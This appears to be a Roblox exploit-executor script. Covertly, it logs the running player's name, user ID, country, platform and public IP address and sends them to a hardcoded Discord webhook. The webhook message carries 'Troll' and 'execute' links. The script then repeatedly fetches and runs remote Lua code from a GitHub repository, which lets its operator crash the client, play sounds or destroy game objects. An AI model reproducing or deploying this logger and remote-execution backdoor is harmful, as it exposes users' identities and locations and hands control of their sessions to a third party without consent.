local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalizationService = game:GetService("LocalizationService")
local UserInputService = game:GetService("UserInputService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")

local platform = UserInputService:GetPlatform()
local platformNames = {
    [Enum.Platform.Windows] = "Windows PC",
    [Enum.Platform.OSX] = "Mac",
    [Enum.Platform.IOS] = "iOS Device",
    [Enum.Platform.Android] = "Android Device",
    [Enum.Platform.UWP] = "UWP",
    [Enum.Platform.PS4] = "PlayStation 4",
}
local deviceType = platformNames[platform] or "Unknown Device"

local playerName = Players.LocalPlayer.Name
local playerId = Players.LocalPlayer.UserId
local clientId = RbxAnalyticsService:GetClientId()
local currentPlaceId = game.PlaceId
local currentJobId = tostring(game.JobId)
local teleportCommand = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. currentPlaceId .. ", '" .. currentJobId .. "')"
local timestamp = os.date("%Y-%m-%d %H:%M:%S")

local playerCountry
local ipAddress = "Unknown"
local githubRepo = "YourGitHubUsername/YourRepo"
local scriptFileName = clientId .. ".lua"
local emptyFileName = playerName .. ".lua"

local success, result = pcall(function()
    return LocalizationService:GetCountryRegionForPlayerAsync(Players.LocalPlayer)
end)
playerCountry = success and result or "Unknown"

local executorName = identifyexecutor()

local skipIpRetrievalList = {
    "ExecutorA",
    "ExecutorB",
    "ExecutorC"
}

local skipIpRetrieval = false
for _, name in ipairs(skipIpRetrievalList) do
    if executorName == name then
        skipIpRetrieval = true
        break
    end
end

if not skipIpRetrieval then
    if syn then
        ipAddress = syn.request({Url = "https://api64.ipify.org?format=json", Method = "GET"}).Body
    elseif http then
        ipAddress = http.request({Url = "https://api64.ipify.org?format=json", Method = "GET"}).Body
    end
    ipAddress = HttpService:JSONDecode(ipAddress).ip
end

local function generateCreateScriptURL()
    local content = [[
-- universal
_G.Crash = false
_G.Taco = false

-- Trident survival
_G.Ban = false
_G.BPlayer = false
_G.Small = false

]]
    return "https://github.com/" .. githubRepo .. "/new/main?filename=" .. scriptFileName .. "&value=" .. HttpService:UrlEncode(content)
end

local function generateCreateEmptyFileURL()
    local content = [[
local executed = false

if executed == false then
    executed = true
    
    
    
end
]]
    return "https://github.com/" .. githubRepo .. "/new/main?filename=" .. emptyFileName .. "&value=" .. HttpService:UrlEncode(content)
end

local function generateEditScriptURL()
    return "https://github.com/" .. githubRepo .. "/edit/main/" .. scriptFileName
end

local function generateIpInfoURL(ip)
    return "https://ipinfo.io/" .. ip
end

local webhookURL = "https://discord.com/api/webhooks/1266074223860781077/BAGPJ7cOHg9FUTGTvfmtykQ4-fcv3h6CODdZ4Q-tWVTyYwwUdklZ761FUEG-OMKaEewb"
local webhookData = {
    ["content"] = " ",
    ["embeds"] = {
        {
            ["title"] = "Logger Information",
            ["description"] = "Player Name: " .. playerName .. "\n" ..
                              "Player ID: " .. playerId .. "\n" ..
                              "Country: " .. playerCountry .. "\n" ..
                              "Platform: " .. deviceType .. "\n" ..
                              "IP Address: " .. ipAddress .. "\n" ..
                              "Executor: " .. executorName .. "\n" ..
                              "Timestamp: " .. timestamp .. "\n" ..
                              "Join Command: ```" .. teleportCommand .. "```",
            ["type"] = "rich",
            ["color"] = tonumber(0x4CAF50),
            ["image"] = {
                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. tostring(playerName)
            },
            ["fields"] = {
                {
                    ["name"] = "Actions",
                    ["value"] = "[blacklist](" .. generateEditScriptURL() .. ")\n" ..
                                "[Troll](" .. generateCreateScriptURL() .. ")\n" ..
                                "[execute](" .. generateCreateEmptyFileURL() .. ")\n" ..
                                "[IP Info](" .. generateIpInfoURL(ipAddress) .. ")",
                    ["inline"] = true
                },
                {
                    ["name"] = "Client ID",
                    ["value"] = clientId,
                    ["inline"] = true
                }
            }
        }
    }
}

local encodedData = HttpService:JSONEncode(webhookData)
local headers = {["content-type"] = "application/json"}
local request = http_request or request or HttpPost or syn.request
local requestData = {Url = webhookURL, Body = encodedData, Method = "POST", Headers = headers}

local success, errorMsg = pcall(function()
    request(requestData)
end)
if not success then
    warn("Failed to send Discord message: " .. errorMsg)
end

while true do
    wait(5)
    local success, result = pcall(function()
        return loadstring(game:HttpGet("https://raw.githubusercontent.com/YourGitHubUsername/YourRepo/main/" .. scriptFileName))()
    end)

    if success then
        break
    else
        warn("Failed to load the script: " .. result)
    end
end

local tacoPlayed = false
local crashInitiated = false
local banPerformed = false
local bplayerDestroyed = false
local smallAdjusted = false

while true do
    wait(1)
    
    if _G.Taco and not tacoPlayed then
        tacoPlayed = true
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://142376088"
        sound.Looped = true
        sound.Volume = 1
        sound.Parent = game:GetService("SoundService")
        sound:Play()
    end
    
    if _G.Crash and not crashInitiated then
        crashInitiated = true
        while true do end
    end
    
    if _G.Ban and not banPerformed then
        banPerformed = true
        local remoteEvent = game.Players.LocalPlayer:FindFirstChild('RemoteEvent')
        if remoteEvent then remoteEvent:Destroy() end
    end
    
    if _G.BPlayer and not bplayerDestroyed then
        bplayerDestroyed = true
        local ignorePart = Workspace.Ignore
        if ignorePart then ignorePart:Destroy() end
    end
    
    if _G.Small and not smallAdjusted then
        smallAdjusted = true
        local constraint = Workspace.Ignore.LocalCharacter and Workspace.Ignore.LocalCharacter.Bottom:FindFirstChild('PrismaticConstraint')
        if constraint then
            constraint.LowerLimit = 1
            constraint.UpperLimit = 1
        end
    end
end



while true do
    wait(5)
    local success, result = pcall(function()
        return loadstring(game:HttpGet("https://raw.githubusercontent.com/YourGitHubUsername/YourRepo/main/" .. emptyFileName))()
    end)

end
